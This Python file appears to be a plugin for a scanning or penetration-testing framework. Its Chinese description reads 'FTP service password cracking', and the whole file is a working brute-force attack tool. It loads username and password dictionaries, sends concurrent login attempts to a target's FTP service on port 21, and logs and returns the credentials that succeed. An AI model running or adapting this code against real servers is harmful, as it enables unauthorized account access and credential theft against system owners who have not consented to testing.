# -*-* coding:UTF-8
import os
from ftplib import FTP


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "ftp服务口令破解",
        "datetime": "2022-01-02"
    }

    def ip(self) -> dict:
        with self.async_pool(max_workers=self.target.setting.asyncio, threshold=self.threshold) as execute:
            for username, password in self.build_login_dict(
                    method=self.target.args.method,
                    username=self.target.args.username or os.path.join('data', 'ftp_username'),
                    password=self.target.args.password or os.path.join('data', 'ftp_password'),
            ):
                execute.submit(self.task, username, password)
            return {'LoginInfo': execute.result()}

    async def task(self, username, password):
        self.log.debug(f'Login => username: {username}, password: {password}')
        ftp = FTP()
        ftp.connect(self.target.value, 21, timeout=self.target.args.timeout)
        ftp.login(user=username, passwd=password)
        ftp.close()
        self.log.info(f'Login => username: {username}, password: {password} [success]')
        return {
            'port': 21,
            'server': 'ftp',
            'username': username,
            'password': password
        }
